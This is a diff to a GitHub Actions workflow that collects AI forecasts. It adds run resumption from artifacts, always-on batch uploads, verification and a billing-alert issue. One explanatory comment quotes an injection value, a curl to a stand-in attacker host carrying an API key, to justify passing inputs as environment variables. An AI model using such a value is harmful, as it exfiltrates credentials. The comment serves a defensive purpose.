@@ -24,10 +24,17 @@ on:
         type: boolean
         required: false
         default: false
+      resume_from_run_id:
+        description: 'Restore batches and checkpoints from a previous run id, and pay only for what is missing'
+        required: false
 
 permissions:
   contents: write
   pull-requests: write
+  # Needed to raise a billing alert when a provider reports no credit.
+  issues: write
+  # Needed to pull a previous run's artifact when resuming.
+  actions: read
 
 jobs:
   elicit:
@@ -66,11 +73,33 @@ jobs:
           MOONSHOT_API_KEY: ${{ secrets.MOONSHOT_API_KEY }}
         run: node tools/run-elicitation.mjs --check
 
+      # Resuming restores whatever the earlier run had already collected:
+      # finished batches are not bought again, and half-finished models pick up
+      # from their checkpoint. This is the recovery path after a run that died
+      # partway or stopped on an empty account.
+      - name: Restore a previous run
+        if: ${{ inputs.resume_from_run_id != '' && !inputs.check_only && !inputs.list_models }}
+        uses: actions/download-artifact@v4
+        with:
+          name: runs-${{ inputs.resume_from_run_id }}
+          path: runs/
+          run-id: ${{ inputs.resume_from_run_id }}
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Report what was restored
+        if: ${{ inputs.resume_from_run_id != '' && !inputs.check_only && !inputs.list_models }}
+        run: |
+          set -euo pipefail
+          echo "Restored $(ls runs/*.json 2>/dev/null | wc -l) batch(es) and $(ls runs/.partial/*.jsonl 2>/dev/null | wc -l) checkpoint(s) from run ${{ inputs.resume_from_run_id }}."
+          node tools/verify-runs.mjs
+
       # Dispatch inputs reach the shell as environment variables rather than
       # expression interpolation: this step holds every provider API key, so a
       # value like "; curl attacker/?k=$OPENAI_API_KEY" must never be able to
       # become a command. The harness validates the values themselves.
       - name: Elicit forecasts
+        id: elicit
+        continue-on-error: true
         if: ${{ !inputs.check_only && !inputs.list_models }}
         env:
           ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
@@ -89,16 +118,63 @@ jobs:
           if [ -n "${MODELS:-}" ]; then argv+=(--models "$MODELS"); fi
           node tools/run-elicitation.mjs "${argv[@]}"
 
-      # Elicitation costs real money, so persist the raw batches before any
-      # later step can fail. The artifact is the recovery path if the push below
-      # is blocked by repo permissions.
+      # Elicitation costs real money, so the batches are persisted before any
+      # step that could fail — including the elicitation step itself, which is
+      # why it is continue-on-error above and this is always(). One model
+      # running out of credit used to discard every batch already collected.
+      # The partial checkpoints come too: they are what makes a re-run pay only
+      # for the shortfall.
       - name: Upload raw batches
-        if: ${{ !inputs.check_only && !inputs.list_models }}
+        if: ${{ always() && !inputs.check_only && !inputs.list_models }}
         uses: actions/upload-artifact@v4
         with:
           name: runs-${{ github.run_id }}
-          path: runs/
-          retention-days: 30
+          path: |
+            runs/
+            !runs/.mock/
+          include-hidden-files: true
+          retention-days: 90
+
+      - name: Verify raw batches
+        if: ${{ always() && !inputs.check_only && !inputs.list_models }}
+        run: node tools/verify-runs.mjs
+
+      # Money problems get their own issue, because they are the one failure
+      # mode a re-run cannot fix on its own — and a red run in the Actions tab
+      # is easy to miss, while an issue arrives by email.
+      - name: Raise a billing alert
+        if: ${{ always() && steps.elicit.outputs.quota_exhausted == 'true' }}
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          MODELS: ${{ steps.elicit.outputs.quota_models }}
+          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
+        run: |
+          set -euo pipefail
+          gh label create billing --color B60205 --description "Provider quota or credit" 2>/dev/null || true
+          # One open issue is enough; a monthly cron should not file twelve.
+          if [ -n "$(gh issue list --label billing --state open --limit 1 --json number --jq '.[].number')" ]; then
+            echo "A billing issue is already open — not filing another."
+            exit 0
+          fi
+          gh issue create \
+            --title "Elicitation blocked: out of quota or credit" \
+            --label billing \
+            --body "$(printf '%s\n' \
+              "Elicitation stopped on these models for billing reasons:" \
+              "" \
+              "**$MODELS**" \
+              "" \
+              "Full per-model detail is in the job summary: $RUN_URL" \
+              "" \
+              "Top up or raise the limit, then re-run the workflow. Samples already collected are restored from the run's checkpoint artifact, so only the shortfall is paid for again.")"
+
+      # Stop here if elicitation failed outright: importing a partial sweep
+      # would publish a board with models missing.
+      - name: Fail the run if elicitation did
+        if: ${{ steps.elicit.outcome == 'failure' && !inputs.check_only && !inputs.list_models }}
+        run: |
+          echo "::error::Elicitation reported failures — batches are saved as an artifact; see the job summary."
+          exit 1
 
       - name: Import into site data
         if: ${{ !inputs.check_only && !inputs.list_models }}
@@ -113,6 +189,7 @@ jobs:
           set -euo pipefail
           node --check public/data.js
           node --check public/app.js
+          node tools/verify-runs.mjs
           node tools/check-site.mjs
 
       # Push a branch rather than using a create-PR action: pushing needs only
